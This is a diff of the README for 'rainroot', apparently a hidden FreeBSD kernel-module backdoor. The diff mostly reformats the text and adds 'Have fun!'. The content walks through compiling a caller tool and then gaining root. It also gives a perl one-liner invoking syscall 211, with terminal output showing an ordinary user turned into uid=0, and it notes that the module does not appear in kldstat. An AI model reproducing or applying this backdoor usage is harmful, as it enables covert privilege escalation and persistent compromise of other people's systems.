@@ -27,31 +27,31 @@ No rainroot in kldstat, just the default kernel.
 
 userland
 ********
+userland tool, to call the newly loaded syscall (normally its syscall 210, depending if you got extra syscalls on your box already) In this examples it is syscall nr 211.
 
-# userland tool, to call the newly loaded syscall (normally its syscall 210, depending if you got extra syscalls on your box already) In this examples it is syscall nr 211.
-
-compile it
+compile it:
 l00ser@crashb0x:/tmp $ gcc48 caller.c -o caller
 
-test for help
+test for help:
 # ./caller 
 rainroot caller
 use appropiate syscallnumber (default: 210)
 example: ./caller 210
 
-execute and get root
+execute and get root:
 l00ser@crashb0x:/tmp % ./caller 211
 l00ser@crashb0x:/tmp % id
 uid=0(root) gid=0(wheel) egid=1001(l00ser) groups=1001(l00ser)
 
-besides the caller you could also go with every language or operation requesting the syscall. for instance
- this perl one-liner:
+besides the caller you could also go with every language or operation requesting the syscall. for instance this perl one-liner:
 
 l00ser@crashb0x:~ % id
 uid=1001(l00ser) gid=1001(l00ser) groups=1001(l00ser)
 l00ser@crashb0x:~ % perl -e 'syscall(211);'
 l00ser@crashb0x:~ % id
 uid=0(root) gid=0(wheel) egid=1001(l00ser) groups=1001(l00ser)
+
+Have fun!
 
 author
 ------
